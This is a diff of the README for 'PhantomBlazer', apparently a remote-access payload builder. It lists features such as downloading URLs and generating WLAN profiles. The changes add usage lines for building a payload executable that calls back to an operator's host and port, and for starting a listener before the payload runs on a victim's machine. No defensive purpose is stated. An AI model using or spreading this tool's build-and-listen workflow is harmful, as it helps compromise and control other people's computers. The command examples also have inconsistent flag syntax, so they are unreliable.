@@ -15,16 +15,19 @@
 - [x] Download URL
 - [x] Open link
 - [x] Generate WLAN profile
-
+## Requirements
+> Same platform as the client
 ## Usage
 
 PhantomBlazer can be executed with the following parameters:
-```
+``` 
+    --mode/-m: Mode: accepts > build or listen
     --lhost/-lh: The local host IP address
     --lport/-lp: The local port number
     --output/-o: The output file name
 ```
-> Example: ``` $python3 phantomblazer.py --lhost 192.168.0.1 --lport 8080 --output payload.exe```
+> Example: ``` python3 phantomblazer.py --m build -lhost <ip.address> --lport <port> --output<application.name>.exe```
+> Before payload execution on client: ``` python3 phantomblazer.py --m listen -lhost <ip.address> --lport <port> ```
 
 ### Inbuilt ommands can be executed using the following syntax:
 ```
